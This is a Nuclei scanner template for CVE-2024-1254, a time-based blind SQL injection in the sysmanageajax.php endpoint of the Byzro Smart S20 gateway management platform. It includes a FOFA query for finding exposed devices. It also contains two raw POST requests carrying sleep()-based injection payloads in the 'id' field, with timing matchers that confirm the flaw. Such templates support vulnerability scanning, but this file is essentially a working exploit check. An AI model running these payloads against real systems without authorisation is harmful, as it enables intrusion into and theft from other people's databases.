id: baichuo-sql-injection
info:
  name: "北京百绰智能S20管理平台sysmanageajax.php接口SQL注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: title="Smart管理平台"
          北京百卓网络科技有限公司(以下简称百卓网络)是一家致力于构建下一代安全互联网的高科技企业。Byzro Networks智能S20网关管理平台的sysmanageajax.php接口存在SQL注入缺陷。攻击者可通过构造恶意SQL语句实现数据库信息泄露，进而可能导致服务器文件系统访问权限提升及敏感数据篡改。
  reference:
  - CVE-2024-1254
  tags: 北京百绰智能S20管理平台
http:
- raw:
  - |
    POST /sysmanage/sysmanageajax.php HTTP/1.11
    Host: {{Hostname}}
    Cookie: PHPSESSID=b7e24f2cb8b51338e8531e0b50da49ee
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded;
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers
    Connection: close

    src=manageadmin&type=add&id=(select*from(select+if(length(database())=3,sleep(5),1))a)|1|1&value=test2|123456
  - |
    POST /sysmanage/sysmanageajax.php HTTP/1.11
    Host: {{Hostname}}
    Cookie: PHPSESSID=b7e24f2cb8b51338e8531e0b50da49ee
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded;
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Te: trailers
    Connection: close

    src=manageadmin&type=add&id=(select*from(select+if(length(database())=3,sleep(8),1))a)|1|1&value=test2|123456
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
